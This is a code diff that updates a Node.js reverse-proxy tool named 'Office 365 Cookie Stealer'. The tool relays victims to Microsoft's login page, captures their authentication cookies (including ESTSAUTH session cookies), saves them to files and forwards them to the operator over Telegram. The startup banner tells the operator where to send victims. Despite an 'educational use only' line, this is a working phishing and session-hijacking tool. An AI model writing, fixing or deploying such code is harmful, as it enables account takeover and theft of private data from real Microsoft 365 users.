@@ -1,5 +1,5 @@
 // =============================================
-// OFFICE 365 COOKIE STEALER - REVERSE PROXY (FIXED)
+// OFFICE 365 COOKIE STEALER - FINAL FIX
 // =============================================
 
 const express = require('express');
@@ -24,6 +24,7 @@ const CONFIG = {
 // =============================================
 app.use(cors());
 app.use(express.json({ limit: '100mb' }));
+app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
 // =============================================
@@ -148,46 +149,42 @@ function extractOfficeCookies(cookies) {
 }
 
 // =============================================
-// ✅ FIXED: PROXY - CORRECT MICROSOFT LOGIN URL
+// ✅ FIXED: Real Microsoft Login Page Handler
 // =============================================
-const MICROSOFT_LOGIN_URL = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize';
+app.get('/login', (req, res) => {
+    // Redirect to Microsoft login with correct parameters
+    const loginUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
+        'client_id=c9a559d2-7aab-4f13-a6ed-e7e9c52aec87' +
+        '&redirect_uri=https%3A%2F%2Fforms.cloud.microsoft%2Flanding' +
+        '&response_type=code' +
+        '&response_mode=form_post' +
+        '&scope=openid%20profile%20offline_access' +  // ← ADDED SCOPE!
+        '&prompt=select_account';
+    
+    console.log('🔄 Redirecting to Microsoft login...');
+    res.redirect(loginUrl);
+});
 
+// =============================================
+// ✅ FIXED: Proxy with CORRECT target
+// =============================================
 const proxyMiddleware = createProxyMiddleware({
-    target: MICROSOFT_LOGIN_URL,
+    target: 'https://login.microsoftonline.com',
     changeOrigin: true,
     secure: true,
     ws: true,
     cookieDomainRewrite: {
         '*': ''
     },
-    pathRewrite: {
-        '^/proxy': ''  // Remove /proxy from path
-    },
     onProxyReq: (proxyReq, req, res) => {
-        console.log('\n🎯 PROXY REQUEST RECEIVED');
-        console.log('🌐 Original URL:', req.url);
+        console.log('\n🎯 PROXY REQUEST');
         console.log('📌 Method:', req.method);
+        console.log('🌐 URL:', req.url);
         
-        // Add required query parameters to avoid the error
-        const queryParams = {
-            client_id: '1b730954-1685-4b74-9bfd-dac224a7b894',
-            redirect_uri: 'https://login.microsoftonline.com/common/oauth2/nativeclient',
-            response_type: 'code',
-            response_mode: 'query'
-        };
-        
-        // Add params if not already present
-        const hasParams = req.url.includes('?');
-        if (!hasParams) {
-            const params = new URLSearchParams(queryParams);
-            proxyReq.path = proxyReq.path + '?' + params.toString();
-            console.log('📤 Added OAuth parameters to request');
-        }
-        
-        const cookieHeader = proxyReq.getHeader('cookie') || req.headers.cookie || '';
-        
+        // Capture cookies from request
+        const cookieHeader = req.headers.cookie || '';
         if (cookieHeader) {
-            console.log('🍪 Cookies in request:', cookieHeader.substring(0, 200) + '...');
+            console.log('🍪 Cookies in request:', cookieHeader.substring(0, 100) + '...');
             
             const cookies = extractCookies({ cookie: cookieHeader });
             const officeCookies = extractOfficeCookies(cookies);
@@ -197,7 +194,7 @@ const proxyMiddleware = createProxyMiddleware({
             console.log(`🎯 Office cookies: ${Object.keys(officeCookies).length}`);
             
             if (hasFullSession) {
-                console.log('🔥 FULL OFFICE 365 SESSION CAPTURED IN PROXY!');
+                console.log('🔥 FULL OFFICE 365 SESSION CAPTURED!');
             }
             
             const timestamp = new Date().toISOString();
@@ -217,34 +214,17 @@ const proxyMiddleware = createProxyMiddleware({
             console.log(`📁 Saved: ${filename}`);
             
             if (Object.keys(officeCookies).length > 0 || hasFullSession) {
-                console.log('📤 Sending Office cookies to Telegram...');
-                
                 let message = '🎯 <b>PROXY CAPTURE - Office 365!</b>\n\n';
                 message += `📅 <b>Time:</b> ${timestamp}\n`;
-                message += `🌐 <b>URL:</b> ${req.url}\n`;
-                message += `🖥️ <b>User-Agent:</b> ${(req.headers['user-agent'] || 'Unknown').substring(0, 80)}...\n\n`;
                 message += `🍪 <b>Total Cookies:</b> ${Object.keys(cookies).length}\n`;
                 message += `🎯 <b>Office Cookies:</b> ${Object.keys(officeCookies).length}\n`;
                 
                 if (hasFullSession) {
                     message += '\n🔥 <b>FULL OFFICE 365 SESSION CAPTURED!</b>\n';
-                    message += '✅ You can now impersonate this user!\n\n';
-                }
-                
-                if (Object.keys(officeCookies).length > 0) {
-                    message += '\n🔑 <b>Critical Office Cookies:</b>\n';
-                    for (const [name, value] of Object.entries(officeCookies)) {
-                        const shortValue = value.length > 40 ? value.substring(0, 40) + '...' : value;
-                        message += `• ${name}: ${shortValue}\n`;
-                    }
                 }
                 
                 sendToTelegram(message, sessionData).catch(console.error);
-            } else {
-                console.log('❌ No Office cookies found in proxy request.');
             }
-        } else {
-            console.log('❌ No cookies in proxy request');
         }
     },
     onProxyRes: (proxyRes, req, res) => {
@@ -253,32 +233,9 @@ const proxyMiddleware = createProxyMiddleware({
             console.log('\n🍪 MICROSOFT SET COOKIES:');
             console.log(setCookie.join('\n'));
             
-            const cookies = {};
-            for (const cookie of setCookie) {
-                const [name, ...valueParts] = cookie.split('=');
-                if (name && valueParts) {
-                    cookies[name] = valueParts.join('=').split(';')[0];
-                }
-            }
-            
             const message = '🍪 <b>New Cookies from Microsoft!</b>\n\n' +
                 setCookie.map(c => `• ${c.substring(0, 100)}...`).join('\n');
             sendToTelegram(message).catch(console.error);
-            
-            const officeCookies = extractOfficeCookies(cookies);
-            if (Object.keys(officeCookies).length > 0) {
-                const sessionData = {
-                    timestamp: new Date().toISOString(),
-                    method: 'SET_COOKIE',
-                    cookies: cookies,
-                    officeCookies: officeCookies,
-                    hasFullSession: cookies['ESTSAUTHPERSISTENT'] || cookies['ESTSAUTH']
-                };
-                
-                const filename = `session_setcookie_${Date.now()}.json`;
-                fs.writeJsonSync(path.join(STORAGE_DIR, filename), sessionData, { spaces: 2 });
-                console.log(`📁 Saved set-cookie: ${filename}`);
-            }
         }
     },
     onError: (err, req, res) => {
@@ -287,30 +244,7 @@ const proxyMiddleware = createProxyMiddleware({
     }
 });
 
-// =============================================
-// PROXY ROUTE
-// =============================================
-app.use('/proxy', (req, res, next) => {
-    console.log('\n🎯 PROXY ACCESS');
-    console.log('📍 Client IP:', req.ip || req.connection.remoteAddress);
-    console.log('🌐 URL:', req.url);
-    next();
-});
-
 app.use('/proxy', proxyMiddleware);
-
-// =============================================
-// ✅ FIXED: Direct Microsoft Login Link (No Proxy)
-// =============================================
-app.get('/login', (req, res) => {
-    const loginUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
-        'client_id=1b730954-1685-4b74-9bfd-dac224a7b894' +
-        '&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient' +
-        '&response_type=code' +
-        '&response_mode=query';
-    
-    res.redirect(loginUrl);
-});
 
 // =============================================
 // CAPTURE ENDPOINT
@@ -358,8 +292,6 @@ app.post('/capture', async (req, res) => {
     console.log(`📁 Saved: ${filename}`);
     
     if (Object.keys(cookies).length > 0) {
-        console.log('📤 Sending to Telegram...');
-        
         let message = '🎯 <b>POST Cookie Capture!</b>\n\n';
         message += `📅 <b>Time:</b> ${timestamp}\n`;
         message += `🌐 <b>URL:</b> ${data.url || req.headers.referer || 'Unknown'}\n`;
@@ -371,25 +303,7 @@ app.post('/capture', async (req, res) => {
             message += '\n🔥 <b>FULL OFFICE 365 SESSION CAPTURED!</b>\n';
         }
         
-        if (Object.keys(cookies).length > 0) {
-            message += '\n📋 <b>All Cookies:</b>\n';
-            let count = 0;
-            for (const [name, value] of Object.entries(cookies)) {
-                if (count < 20) {
-                    const shortValue = value.length > 40 ? value.substring(0, 40) + '...' : value;
-                    message += `• ${name}: ${shortValue}\n`;
-                    count++;
-                } else {
-                    message += `• ... and ${Object.keys(cookies).length - 20} more\n`;
-                    break;
-                }
-            }
-        }
-        
         await sendToTelegram(message, sessionData);
-        
-    } else {
-        console.log('❌ No cookies found. Nothing sent to Telegram.');
     }
     
     res.json({
@@ -428,7 +342,7 @@ app.listen(PORT, () => {
 ║   📁 Captures: ${STORAGE_DIR}/                              ║
 ║                                                              ║
 ║   📌 SEND VICTIM TO:                                       ║
-║   🔗 https://your-railway-url/proxy                        ║
+║   🔗 https://your-railway-url/login                        ║
 ║                                                              ║
 ║   ⚠️  FOR EDUCATIONAL USE ONLY!                            ║
 ║                                                              ║
